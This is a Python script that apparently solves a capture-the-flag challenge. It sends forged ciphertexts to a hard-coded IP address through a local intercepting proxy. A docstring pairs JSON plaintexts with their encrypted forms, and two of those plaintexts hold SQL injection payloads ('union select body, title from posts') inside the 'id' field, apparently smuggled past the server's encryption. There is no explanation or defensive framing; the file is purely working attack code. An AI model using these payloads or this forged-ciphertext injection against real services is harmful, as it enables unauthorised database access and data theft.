import sys
import requests

from u.common import b64e, b64d

def decrypt(url, data):
    de = b64e(data)
    r = requests.get(f'{url}?post={de}',  proxies={'http':'http://127.0.0.1:8080'}, allow_redirects=False)
    #r = requests.get(f'{url}?post={de}',  allow_redirects=False)
    return r.text


url = 'http://34.74.105.127/085047b1af/'

"""
    text : pad(b'{"id":"1", "key":"1231029312903821903293130209312"}')
    endoded : 2ccff8244bc03206004dbafab8a2945acb0938b06353283286895e3ec53ed99d272d2907ff5eafc88c3ac73d83a197e633de607fdbaffd7c9b71f57fd4ca21da67dbbf255cf6b56fbe89e7194c4e482c

    text: pad(b'{"id":"\' union select body, title from posts order by id asc limit 1 #", "key":"1"}')
    encoded: aeaba0f4848a4ce18316a82f91aa63e64b99410ac80a1cc789156bcfbd753ed20277ee230d750322965d215da21dfcced494d42d536274e1675d700621ee2c23ffb355203c98fd9a3cfe4a07d79ffb125aa9d734bb80dd60774e97e0caa76154796d6ff2a0b689bcf54dde3763be06a5

    text: pad(b'{"id":"0 union select body, title from posts where id = 1", "key":"1"}')
    encoded: 9c1df9f63b3669a310730d06306844499bc8a913085953899c787ade7ff2642442956916bcd824893b4a5b64d9e1970b11944b7823cf8fe20e80ecdffc1cbc099189768806d23c71ea0d26edd7a743520e128dd92fb93ead968c3683d1ac51b8
"""

datae = bytes.fromhex('9c1df9f63b3669a310730d06306844499bc8a913085953899c787ade7ff2642442956916bcd824893b4a5b64d9e1970b11944b7823cf8fe20e80ecdffc1cbc099189768806d23c71ea0d26edd7a743520e128dd92fb93ead968c3683d1ac51b8')

if __name__ == '__main__':
    decrypt(url, datae)